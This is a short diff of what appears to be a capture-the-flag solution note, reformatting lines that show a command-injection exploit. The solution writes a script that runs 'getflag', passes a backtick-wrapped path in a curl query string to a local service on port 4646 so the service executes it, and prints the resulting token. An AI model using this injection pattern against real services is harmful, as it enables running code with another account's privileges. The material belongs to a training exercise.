@@ -1,12 +1,12 @@
 bnfsuyvfhdyvufdbv 
 
-nano /tmp/CMD
->#!/bin/bash
->getflag > /tmp/token
+>nano /tmp/CMD
+    #!/bin/bash
+    getflag > /tmp/token
 
-chmod 777 /tmp/CMD
+>chmod 777 /tmp/CMD
 
-curl localhost:4646?=x='`/*/CMD`'
+>curl localhost:4646?=x='`/*/CMD`'
 
-cat /tmp/CMD
->Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+>cat /tmp/CMD
+    Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
